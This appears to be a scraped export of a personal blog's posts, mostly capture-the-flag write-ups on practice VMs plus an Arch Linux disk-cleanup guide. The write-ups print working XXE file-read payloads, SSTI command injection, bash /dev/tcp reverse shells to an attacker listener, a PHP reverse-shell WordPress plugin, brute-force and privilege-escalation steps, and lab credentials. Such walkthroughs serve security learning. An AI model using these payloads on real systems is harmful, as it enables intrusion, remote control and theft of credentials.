GNU&#x2F;Linux Let’s go.https://www.exploit-db.com/exploits/37292I download the exploit on his computer in /tmp. wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;37292 -O exp.c Then use gcc: gcc exp.c -o ofs And run it. .&#x2F;ofs I’m root ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"cms","slug":"cms","permalink":"https://peanutstick.github.io/tags/cms/"}]},{"title":"CTF hacker kid","slug":"CTF hacker kid","date":"2022-02-28T02:19:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF hacker kid.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20hacker%20kid.html","excerpt":"","text":"netdiscover 192.168.0.32 nmapnmap -Sv 192.168.0.32 -p- PORT STATE SERVICE VERSION 53&#x2F;tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) 9999&#x2F;tcp open http Tornado httpd 6.1 Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Port 80web page gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.32&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;css (Status: 301) [Size: 310] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;css&#x2F;] &#x2F;javascript (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;javascript&#x2F;] &#x2F;images (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;images&#x2F;] &#x2F;server-status (Status: 403) [Size: 277] Nothing interesting. Port 9999http://192.168.0.32:9999/login?next=%2F gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.32:9999&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;login (Status: 200) [Size: 452] &#x2F;logout (Status: 302) [Size: 0] [--&gt; &#x2F;] source code I remove the hidden argument. I have something to do with the xsrf cookie but it’s too hard to find the right cookie to inject. Back to port 80TO DO: Use a GET parameter page_no to view pages. So I have to do something like this:http://192.168.0.32/index.php?page_no=1And it’s working: I will script something, I can do it with burpsuit too.I’m grabing the size of the page. i&#x3D;0 n&#x3D;3654 while true; do size&#x3D;$(curl -so &#x2F;dev&#x2F;null http:&#x2F;&#x2F;192.168.0.32&#x2F;index.php\\?page_no\\&#x3D;$i -w &#39;%&#123;size_download&#125;&#39;) echo &quot;$i: $size&quot; if [ $size !&#x3D; $n ]; then break fi ((i&#x3D;i+1)) done Output: ➜ hackerkid .&#x2F;c.sh 0: 3654 1: 3654 2: 3654 3: 3654 4: 3654 5: 3654 6: 3654 7: 3654 8: 3654 9: 3654 10: 3654 11: 3654 12: 3654 13: 3654 14: 3654 15: 3654 16: 3654 17: 3654 18: 3654 19: 3654 20: 3654 21: 3849 Page 21http://192.168.0.32/index.php?page_no=21 /etc/hostsI’m adding this line to my file. 192.168.0.32 hacker.blackhat.local blackhat.local digI have to use dig on the domain name. dig hackers.blackhat.local @192.168.0.32 ; &lt;&lt;&gt;&gt; DiG 9.18.0 &lt;&lt;&gt;&gt; hackers.blackhat.local @192.168.0.32 ;; global options: +cmd ;; Got answer: ;; WARNING: .local is reserved for Multicast DNS ;; You are currently testing what happens when an mDNS query is leaked to DNS ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 17027 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good) ;; QUESTION SECTION: ;hackers.blackhat.local. IN A ;; AUTHORITY SECTION: blackhat.local. 3600 IN SOA blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600 ;; Query time: 3 msec ;; SERVER: 192.168.0.32#53(192.168.0.32) (UDP) ;; WHEN: Sun Feb 20 15:28:23 CET 2022 ;; MSG SIZE rcvd: 125 COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good)hackerkid.blackhat.local Now I have to add it to my hosts file. hackerkid.blackhat.local xxe exploitThe form is build with xml, so I can exploit it with a xxe exploit.https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83 You have to type this in the xml request, it will display nothing. &lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> And then display it wih this: &amp;xxe; But you can’t put it anywhere, it have to replace the email content. Read the bashrcFist I tryed to download a file then execute it with php.And use curl -O on a revershell script but it’s not working too.https://cxyy4rle.blogspot.com/2019/10/reading-local-files-with-xxe-attacks.html I willl try this on the user saket, I saw him in the /etc/passwd. &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY > &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/home/saket/.bashrc\" >]> Now I have to decode it:https://www.base64decode.org/ #Setting Password for running python app username&#x3D;&quot;admin&quot; password&#x3D;&quot;Saket!#$%@!!&quot; Tornado serverI have to login to the website with there’s credentials.http://192.168.0.32:9999/login?next=%2FI’m using saket because it’s not working with admin, and this user is un the /etc/passwd file and in the password. I’m logged. There is nothing else on this page. Tell me your name buddy How can i get to know who are you ?? He want a name, and he is using the word get, I’m not the best in english but, I think this sentence could be “how can I know who you are?”So I have to get a name. SSTIhttps://support.clickmeter.com/hc/en-us/articles/211032666-URL-parameters-How-to-pass-it-to-the-destination-URL www.yoursite.com?myparam={id}Let’s try it:http://192.168.0.32:9999/?name={id} Can I do something with this?http://192.168.0.32:9999/?name=49 This is good, the name of what I’m doing is Server Side Template Injection (SSTI). ReversshellSo I found a way to exec a command. http:&#x2F;&#x2F;192.168.0.32:9999&#x2F;?name&#x3D;&#123;%import%20os%&#125;&#123;&#123;os.popen(%22whoami%22).read()&#125;&#125; Good now I want to use a revershell.I’m gonnna use this one: bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&quot; But when I’m trying to run it in my browser I have an error.I have to use burpsuit.With this tool I saw where was the problem, the &amp; was not in the payload, it was interpreted as an another command.I have to encode my request and then send it.https://www.urlencoder.org/ &#123;% import os %&#125;&#123;&#123;os.system(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&quot;&#39;)&#125;&#125; Output: %7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F4648%200%3E%261%22%27%29%7D%7D I have to listen first. nc -nlvp 4648 EnumerationCreate web serverOn my computer. python2.7 -m SimpleHTTPServer Download themwget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lin.py Nothing interesting Bash history Only this part is interesting. python2.7 inject.py 405 nc 127.0.0.1 5600 ps -eax|grep root ps -eaf|grep root python2.7 inject.py 735 nc 127.0.0.1 5600 So, in the first line he is using an injector on the PID 405.Then open netcat to listen.I think it was the wrong PID so he list them.He list the PID with root permisions.Then use the injector with the good PIDAnd he use the commands: ps -eax|grep root ps -eaf|grep root exploithttps://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc saket@ubuntu:~$ ps -eaf|grep root ps -eaf|grep apache root 1363 1 0 05:44 ? 00:00:00 &#x2F;usr&#x2F;sbin&#x2F;apache2 -k start The PID is 1363. python2 inject.py 1363 You can check the open port, it should be 5600. netstat -tnlp Then we can use netcat to listen on the port. nc 127.0.0.1 5600 Now you are root. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://peanutstick.github.io/tags/SSTI/"}]},{"title":"How to gain some GiB on Arch Linux","slug":"How to gain some GiB on Arch Linux","date":"2022-02-21T02:15:00.000Z","updated":"2023-04-12T15:10:22.386Z","comments":true,"path":"/post/How to gain some GiB on Arch Linux.html","link":"","permalink":"https://peanutstick.github.io/post/How%20to%20gain%20some%20GiB%20on%20Arch%20Linux.html","excerpt":"","text":"See remaining space➜ ~ df -h FS Size Used Free Used% mount dev 3,8G 0 3,8G 0% &#x2F;dev run 3,9G 1,4M 3,9G 1% &#x2F;run &#x2F;dev&#x2F;nvme0n1p2 39G 27G 11G 72% &#x2F; tmpfs 3,9G 11M 3,9G 1% &#x2F;dev&#x2F;shm tmpfs 3,9G 1,6M 3,9G 1% &#x2F;tmp &#x2F;dev&#x2F;nvme0n1p3 78G 42G 32G 58% &#x2F;home &#x2F;dev&#x2F;sda1 328G 179G 133G 58% &#x2F;hdd &#x2F;dev&#x2F;sda6 394G 306G 68G 82% &#x2F;home&#x2F;peanutstick&#x2F;games &#x2F;dev&#x2F;sda7 99G 42G 58G 42% &#x2F;iso tmpfs 783M 84K 783M 1% &#x2F;run&#x2F;user&#x2F;1000 Scan a filesystemInstall ncdu pacman -S ncdu Then use it.Place yourself in the file system you whant to scan. ➜ ~ pwd &#x2F;home&#x2F;peanutstick ➜ ~ sudo ncdu -x Remove a packagesudo pacman -Rsn &lt;Package name&gt; Remove pacman cache1O GiB is gone for the cashe To remove all uninstalled packages sudo pacman -Sc List 10 biggest package yayyay -Ps &#x3D;&#x3D;&gt; Yay version v11.1.0.r5.g19d42ae &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&gt; Nombre total de paquets installés :1560 &#x3D;&#x3D;&gt; Foreign installed packages: 63 &#x3D;&#x3D;&gt; Installation explicite des paquets : 328 &#x3D;&#x3D;&gt; Taille totale occupée par les paquets : 13.3 GiB &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&gt; Dix plus gros paquets : ghidra: 928.1 MiB burpsuite: 504.2 MiB wine-staging: 502.2 MiB rust: 496.6 MiB nvidia-utils: 437.6 MiB go: 432.3 MiB metasploit: 330.8 MiB dotnet-sdk-bin: 303.5 MiB noto-fonts-cjk: 297.8 MiB visual-studio-code-bin: 275.2 MiB &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; :: Interrogation de AUR... -&gt; Paquets AUR orphelins : agg -&gt; Paquets AUR marqués comme obsolètes : optimus-manager responder","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Jordaninfosec","slug":"CTF Jordaninfosec","date":"2022-02-18T04:11:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Jordaninfosec.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Jordaninfosec.html","excerpt":"","text":"netdiscovery 192.168.0.30 nmapnmap -sV -p- 192.168.0.30 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.30&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt First flaghttp://192.168.0.30/flag/The 1st flag is : {8734509128730458630012095} gobuster on uploaded_filesgobuster dir -t 100 -u http://192.168.0.30/uploaded_files -w Documents/wordlist/directory-list-medium.txt robots.txthttp://192.168.0.30/robots.txt User-agent: *Disallow: /Disallow: /backupDisallow: /adminDisallow: /admin_areaDisallow: /r00tDisallow: /uploadsDisallow: /uploaded_filesDisallow: /flag flag192.168.0.30/admin_area/https://i.imgur.com/nJdZs9h.pngusername : adminpassword : 3v1l_H@ck3rThe 2nd flag is : {7412574125871236547895214}It’s not realist… and too easy. Connect as admin to the web pagehttp://192.168.0.30/index.php Upload php revers shellhttps://github.com/pentestmonkey/php-reverse-shellI upload my revershell.49 $ip = ‘192.168.0.21’; // CHANGE THIS50 $port = 4648; // CHANGE THIS ncnc -nlvp 4648 open the filehttp://192.168.0.30/uploaded_files/php-reverse-shell.php I have a shellhttps://i.imgur.com/e71ZKtm.png Enumopen http serverin my script directory python2.7 -m SimpleHTTPServer Download themwget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lin.py wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;pol.py lse.shhttps://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh sh lse.sh [*] sys050 Can root user log in via SSH?…………………………….. yes! /var/www/html/hint.txttry to find user technawi password to read the flag.txt file, you can find it in a hidden file ;) The 3rd flag is : {7645110034526579012345670} Find the hidden filefind &#x2F; -name &quot;.*&quot; 2&gt; &#x2F;dev&#x2F;null /home/technawi/.sudo_as_admin_successfulSo I can use sudo with the user technawi https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#files-containing-passwords grep --color&#x3D;auto -rnw &#39;&#x2F;etc&#39; -ie &quot;technawi&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null &#x2F;etc&#x2F;subgid:3:technawi:165536:65536 &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt:3:username : technawi &#x2F;etc&#x2F;subuid:3:technawi:165536:65536 &#x2F;etc&#x2F;passwd:30:technawi:x:1000:1000:technawi,,,:&#x2F;home&#x2F;technawi:&#x2F;bin&#x2F;bash &#x2F;etc&#x2F;group:5:adm:x:4:syslog,technawi &#x2F;etc&#x2F;group:18:cdrom:x:24:technawi &#x2F;etc&#x2F;group:21:sudo:x:27:technawi &#x2F;etc&#x2F;group:23:dip:x:30:technawi &#x2F;etc&#x2F;group:35:plugdev:x:46:technawi &#x2F;etc&#x2F;group:49:lxd:x:110:technawi &#x2F;etc&#x2F;group:54:technawi:x:1000: &#x2F;etc&#x2F;group:55:lpadmin:x:115:technawi &#x2F;etc&#x2F;group:56:sambashare:x:116:technawi hehe cat &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt The 4th flag is : &#123;7845658974123568974185412&#125; username : technawi password : 3vilH@ksor sshssh technawi@192.168.0.30 3vilH@ksor sudosudo -l [sudo] password for technawi: Matching Defaults entries for technawi on Jordaninfosec-CTF01: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;bin User technawi may run the following commands on Jordaninfosec-CTF01: (ALL : ALL) ALL Ok sudo su root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# whoami root root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# cd &#x2F;var&#x2F;www&#x2F;html root@Jordaninfosec-CTF01:&#x2F;var&#x2F;www&#x2F;html# cat flag.txt The 5th flag is : &#123;5473215946785213456975249&#125; Good job :) You find 5 flags and got their points and finish the first scenario.... It was too easy. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"privesc","slug":"privesc","permalink":"https://peanutstick.github.io/tags/privesc/"}]},{"title":"CTF Deathnote","slug":"CTF Deathnote","date":"2022-02-08T08:20:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Deathnote.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Deathnote.html","excerpt":"","text":"CTF DeathnoteCTF Linux Created At : 2022-02-08 02:20 Count:1.2k Views 👀 :2167 Netdiscoversudo netdiscover 192.168.0.27 nmapnmap -sV -p- 192.168.0.27 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian)) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.27 -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2022&#x2F;02&#x2F;07 19:28:21 Starting gobuster in directory enumeration mode &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x2F;wordpress (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;] &#x2F;manual (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;manual&#x2F;] &#x2F;server-status (Status: 403) [Size: 277] gobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2022&#x2F;02&#x2F;07 19:30:38 Starting gobuster in directory enumeration mode &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x2F;wp-content (Status: 301) [Size: 327] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-content&#x2F;] &#x2F;wp-includes (Status: 301) [Size: 328] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-includes&#x2F;] &#x2F;wp-admin (Status: 301) [Size: 325] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-admin&#x2F;] /etc/hosts /etc/hosts 192.168.0.27 deathnote.vuln Now I can load the website. Hint in the source codeview-source:http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/ wget http:&#x2F;&#x2F;deathnote.vuln&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2021&#x2F;07&#x2F;user.txt wget http:&#x2F;&#x2F;deathnote.vuln&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2021&#x2F;07&#x2F;notes.txt So user is a list of username and notes should be a list of password. brute force wordpressecho &quot;iamjustic3&quot; &gt;&gt; user.txt echo &quot;iamjustic3&quot; &gt;&gt; notes.txt echo &quot;L&quot; &gt;&gt; user.txt echo &quot;L&quot; &gt;&gt; notes.txt wpscan --url http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F; -U user.txt -P notes.txt [SUCCESS] - KIRA / iamjustic3[SUCCESS] - kira / iamjustic3Good, now I have to login and upload a revers shell in php. Upload the payload vim rs.php &lt;?php &#x2F;** * Plugin Name: Peanut&#39;s Revers Shell * Author: Peanutstick *&#x2F; exec(&quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&#39;&quot;); ?&gt; zip -r rs.zip rs.php nc -lvp 4648 Now I can send the file, and activate it. EnumerationDownloading my scriptsOn my computer: python2.7 -m SimpleHTTPServer On the target mkdir sc cd sc wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lp.sh chmod +x lse.sh lp.sh .&#x2F;lse.sh .&#x2F;lp.sh Nothing interesting with the lselp:Sound interesting ╔══════════╣ .sh files in path ╚ https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;linux-unix&#x2F;privilege-escalation#script-binaries-in-path &#x2F;usr&#x2F;bin&#x2F;gettext.sh Good ╔══════════╣ Analyzing SSH Files (limit 70) -rw-r--r-- 1 kira kira 393 Jul 19 2021 &#x2F;home&#x2F;kira&#x2F;.ssh&#x2F;authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3&#x2F;Jy93n0NfPqOX7HGkLBasYR0v&#x2F;IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj&#x2F;6vBi+wMyFF3jQhP4Su72ssLH1n&#x2F;E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k&#x2F;POyhURC6MW0V&#x2F;aQICFZ6z l@deathnote ChallengeResponseAuthentication no UsePAM yes Users: ╔══════════╣ Last time logon each user Username Port From Latest root tty1 Mon Jul 19 11:26:48 -0400 2021 l pts&#x2F;0 192.168.1.6 Sat Sep 4 06:12:29 -0400 2021 kira pts&#x2F;1 127.0.0.1 Sat Sep 4 06:00:09 -0400 2021 L homeIn the file user.txt www-data@deathnote:&#x2F;home&#x2F;l$ cat us* cat us* ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------. Brainfuck i think u got the shell , but you wont be able to kill me -kira let’s dive deeper. /opt/Lwww-data@deathnote:&#x2F;opt&#x2F;L&#x2F;fake-notebook-rule$ file case.wav file case.wav case.wav: ASCII text www-data@deathnote:&#x2F;opt&#x2F;L&#x2F;fake-notebook-rule$ cat case.wav cat case.wav 63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d https://www.convertstring.com/fr/EncodeDecode/HexDecodeAnd I got this: cGFzc3dkIDoga2lyYWlzZXZpbCA=https://www.base64decode.org/And I got this: “passwd : kiraisevil”kiraisevil I’ve tried this password with the ssh key and without, it’s not for the ssh. kirasu kirra Password: kiraisevil id uid&#x3D;1001(kira) gid&#x3D;1001(kira) groups&#x3D;1001(kira),27(sudo) Spawn a better shell python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; Read kira.txt cat &#x2F;home&#x2F;kira&#x2F;kira.txt cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp Oh no… I don’t like this.Nvm let’s be root $ sudo -l sudo -l [sudo] password for kira: kiraisevil Matching Defaults entries for kira on deathnote: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin User kira may run the following commands on deathnote: (ALL : ALL) ALL The basic sudo su. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"cms","slug":"cms","permalink":"https://peanutstick.github.io/tags/cms/"}]},{"title":"CTF Paper","slug":"CTF Paper","date":"2022-02-06T10:07:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Paper.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Paper.html","excerpt":"","text":"CTF PaperCTF Linux Created At : 2022-02-06 04:07 Count:1.3k Views 👀 :2168 /etc/hostsecho &quot;10.129.147.140 paper.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts rustscanrustscan -a paper.htb --range 1-65000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 443&#x2F;tcp open https syn-ack nmapnmap -sV -p 80,443,22 paper.htb PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.0 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.37 ((centos) OpenSSL&#x2F;1.1.1k mod_fcgid&#x2F;2.3.9) 443&#x2F;tcp open ssl&#x2F;http Apache httpd 2.4.37 ((centos) OpenSSL&#x2F;1.1.1k mod_fcgid&#x2F;2.3.9) Apache outdated. Directory listingwfuzz --sc 200 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;paper.htb&#x2F;FUZZ Nothing sub domain listingwfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains.lst -u &#39;http:&#x2F;&#x2F;paper.htb&#39; -H 